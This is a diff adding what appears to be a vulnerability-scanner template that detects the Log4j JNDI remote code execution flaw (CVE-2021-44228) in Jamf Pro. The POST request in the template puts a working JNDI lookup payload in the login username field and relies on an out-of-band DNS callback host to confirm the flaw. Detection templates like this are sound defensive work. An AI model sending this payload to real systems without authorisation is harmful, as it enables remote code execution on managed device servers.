@@ -1,0 +1,37 @@
+id: jamf-pro-log4j-rce
+brief:
+    title: JamF Pro - Remote Code Execution (Apache Log4j)
+    by: DhiyaneshDK
+    level: critical
+    about: JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), a...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - jamf
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}'
+      body: username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
+      signs:
+        - "on": word
+          has:
+            - <title>Jamf Pro Login</title>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
